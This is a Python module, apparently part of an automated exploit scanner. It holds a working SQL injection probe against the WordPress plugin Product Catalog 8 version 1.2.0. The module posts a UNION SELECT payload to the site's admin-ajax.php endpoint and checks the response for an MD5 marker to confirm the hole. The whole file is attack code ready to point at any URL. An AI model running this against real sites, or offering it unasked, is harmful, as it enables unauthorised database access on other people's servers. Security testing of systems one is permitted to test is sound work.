import requests
from ...exploit import Exploit, CMS, Categorys
from ....config import Config
from ....handler.retry.retryrequest import RetryRequest

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

class ProductCatalog(Exploit):
    name = "WordPress Plugin Product Catalog 8 1.2.0"
    cms = CMS.Wordpress
    category = Categorys.SQL
    cve = "N/A"

    def run(self, url):
        post_data = {
            'selectedCategory': '0 UNION SELECT md5(1),2,3,4,5,6',
            'action': 'UpdateCategoryList'
        }
        check_requst = retry_request.retry(requests.post, f"{url}/wp-admin/admin-ajax.php", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()}, data=post_data)
        if check_requst.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in check_requst.text:
            return True
        return False